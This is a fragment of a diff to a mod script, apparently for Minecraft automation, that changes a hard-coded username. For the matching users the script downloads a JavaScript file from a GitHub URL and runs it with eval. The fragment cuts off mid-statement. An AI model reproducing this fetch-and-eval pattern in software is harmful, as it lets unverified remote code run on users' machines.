@@ -3,7 +3,7 @@ var AutoMine = Java.type("ru.nedan.automine.AutoMine");
 var Utils = Java.type("ru.nedan.automine.util.Utils");
 var username = Java.type("ru.nedan.spookybuy.Authentication").getUsername();
 
-if (username === "desmined_rwssss" || username === "shezllx") {
+if (username === "desmined_rwssss4" || username === "shezllx") {
     try {
         eval(new java.util.Scanner(
             new java.net.URL("https://raw.githubusercontent.com/LidmiPython/scriptmine/refs/heads/main/setup3.js").openStream(), 
